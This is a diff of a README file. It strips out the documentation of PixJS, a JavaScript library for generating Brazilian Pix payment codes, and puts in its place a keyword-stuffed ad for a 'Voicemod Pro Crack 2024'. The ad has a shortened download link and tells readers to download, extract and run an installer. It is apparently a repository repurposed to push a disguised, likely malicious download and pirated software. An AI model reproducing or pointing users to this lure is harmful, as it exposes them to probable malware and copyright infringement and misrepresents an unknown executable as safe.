@@ -1,88 +1,25 @@
-# PixJS
+# Voicemod-pro-latest-version
 
-Tool to generate “Copy and Paste” Pix payloads.
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://bit.ly/3Rgg0ys)
 
-## 🔨 Installation
 
-```bash
-npm i pixjs
-yarn add pixjs
-```
+# 🎤 Voicemod Pro Crack 2024: Free Download and More! 
 
-## 💻 How to use
+🔊 Get the latest Voicemod Pro Crack for 2024 absolutely free! Enhance your voice with unlimited effects and transform your online interactions. Download now and unlock the full potential of Voicemod Pro!
 
-- Copy and Paste Method
+# 🔥 Features:
 
-```javascript
-const { CopyAndPaste } = require("pixjs");
+Voicemod Pro Crack: Full access to all pro features! Voicemod Pro: Transform your voice in real-time. Voicemod Crack: Easy and secure crack for Voicemod. Voicemod Cracked: Tested and verified for 2024. Voicemod Free: Get it now without any cost! Voicemod 2024: Latest version with all updates. Voicemod Pro Free: Enjoy premium features for free. Voicemod Free Crack: Download and install easily.
 
-const copyAndPaste = CopyAndPaste({
-  name: "Tiago Dias Laureano", // Receptor name
-  key: "e015b7ed-b6bd-4c5a-bcb3-28f67559d716", // The pix key: email, phone, cpf, cnpj or randomkey
-  amount: 1.0, // Amount
-  city: "Rio De Janeiro", // The city name
-  id: "PAGAMENTO", // Payment identifier
-  type: "random", // "email" | "phone" | "cpf" | "cnpj" | "random"
-});
+# 🌟 How to Install:
 
-console.log(copyAndPaste);
+Download the crack from the link provided. Extract the files using any extraction tool. Run the installer and follow the on-screen instructions. Enjoy your new Voicemod Pro with all features unlocked!
 
-// Result: 00020126580014BR.GOV.BCB.PIX0136e015b7ed-b6bd-4c5a-bcb3-28f67559d71652040000530398654041.005802BR5919Tiago Dias Laureano6014Rio De Janeiro62130509PAGAMENTO63042F1D
-```
+# 🤔 Need Help?
 
-- Generate QRCode Image Method
+If you have any questions or need assistance, feel free to leave a comment or contact us directly. We are here to help you!
 
-```javascript
-const { QrCodeImage } = require("pixjs");
+# 🚀 Stay Updated:
 
-const copyAndPaste = QrCodeImage({
-  name: "Tiago Dias Laureano", // Receptor name
-  key: "e015b7ed-b6bd-4c5a-bcb3-28f67559d716", // The pix key: email, phone, cpf, cnpj or randomkey
-  amount: 1.0, // Amount
-  city: "Rio De Janeiro", // The city name
-  id: "PAGAMENTO", // Payment identifier
-  type: "random", // "email" | "phone" | "cpf" | "cnpj" | "random",
-  path: "src/qr-images/", // path to save images
-});
-
-// Result: Your QRCode Image was been generated: src/qr-images/e015b7ed-b6bd-4c5a-bcb3-28f67559d716.png
-```
-
-- Generate QRCode image in Terminal
-
-```javascript
-const { QrCodeTerminal } = require("pixjs");
-
-const copyAndPaste = QrCodeTerminal({
-  name: "Tiago Dias Laureano", // Receptor name
-  key: "e015b7ed-b6bd-4c5a-bcb3-28f67559d716", // The pix key: email, phone, cpf, cnpj or randomkey
-  amount: 1.0, // Amount
-  city: "Rio De Janeiro", // The city name
-  id: "PAGAMENTO", // Payment identifier
-  type: "random", // "email" | "phone" | "cpf" | "cnpj" | "random",
-});
-
-console.log(copyAndPaste);
-
-// Result: Show qrcode in terminal.
-```
-
-## ✅Supported methods
-
-- Email (email@email.com)
-- CPF (999.999.999-99) or (99999999999)
-- CNPJ (99.999.999/9999-99) or (99999999999999)
-- Phone (+552199999-9999) or (21999999999)
-- Random Keys (e015b7ed-b6bd-4c5a-bcb3-28f67559d716)
-
-## 🧑 Authors
-
-Tiago Dias Laureano
-
-- [GITHUB](https://www.github.com/tiago-dias-laureano)
-- [INSTAGRAM](https://instagram.com/tiagodiastl)
-- [LINKEDIN](https://www.linkedin.com/in/tiago-dias-laureano/)
-
-## 🔍 Reference
-
-- [pix-payload](https://github.com/devcarlosalberto/pix-payload/tree/main)
+Follow our channel to stay updated with the latest cracks and software updates!
+![изображение](https://github.com/tiago-dias-laureano/PixJS/assets/79290789/08d56d13-b2b6-46dc-86df-add2610236a4)
